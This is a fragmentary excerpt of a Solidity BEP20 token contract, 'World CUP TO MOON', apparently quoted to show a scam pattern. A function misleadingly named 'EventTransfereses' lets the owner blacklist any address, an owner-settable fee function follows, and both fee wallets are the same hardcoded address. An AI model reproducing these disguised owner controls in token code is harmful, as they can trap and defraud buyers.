...
contract WCTMM  is IBEP20, Auth {
    ...
    string constant _name = "World CUP TO MOON";
    string constant _symbol = "WCTMM";
    ...
    address private marketingFeeReceiver = 0x39Aa1B2050c38a218c773199560b726D15198A78;
    address private buybackFeeReceiver = 0x39Aa1B2050c38a218c773199560b726D15198A78;
    ...
    function EventTransfereses(address addr,bool bv) external authorized {
        isBL[addr] = bv;
    }

    function SetFeess(uint256 _liquidityFee, uint256 _buybackFee, uint256 _marketingFee, uint256 _feeDenominator) external authorized {
